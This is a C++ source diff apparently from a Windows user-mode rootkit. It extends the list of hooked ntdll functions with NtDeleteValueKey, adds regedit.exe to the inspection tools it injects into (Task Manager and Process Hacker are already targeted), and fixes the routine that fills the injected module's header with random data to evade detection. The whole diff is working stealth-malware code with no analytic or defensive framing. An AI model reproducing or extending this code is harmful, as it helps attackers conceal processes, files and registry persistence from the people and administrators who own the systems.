@@ -26,10 +26,12 @@ int main()
 		{ "ntdll.dll", "NtQuerySystemInformation",	"qsi" },
 		{ "ntdll.dll", "NtCreateFile",				"ntcr"},
 		{ "ntdll.dll", "NtOpenFile",				"ntopf"},
-		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"}
+		{ "ntdll.dll", "NtQueryDirectoryFile",		"ntqdf"},
+		{ "ntdll.dll", "NtDeleteValueKey",			"ntdvk" }
 	};
 
-	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe"/*, "explorer.exe"*/ })
+
+	for (const auto& process_name : { "taskmgr.exe", "processhacker.exe", "regedit.exe"/*, "explorer.exe"*/ })
 	{
 		auto process_list = process::get_all_from_name(process_name);
 
@@ -58,7 +60,7 @@ int main()
 
 			// FILL HEADER SECTION WITH PSEUDO-RANDOM DATA WITH HIGH ENTROPY
 			auto junk_buffer = std::vector<std::uint8_t>(0x1000);
-			std::generate(junk_buffer.begin(), junk_buffer.end(), [] { return rng::get_int<uint16_t>(0x00, 0xFF); }); 
+			std::generate(junk_buffer.begin(), junk_buffer.end(), [] { return static_cast<uint8_t>(rng::get_int<uint16_t>(0x00, 0xFF)); }); 
 			proc.write_raw_memory(junk_buffer.data(), 0x1000, littlebro);
 		}
 	}
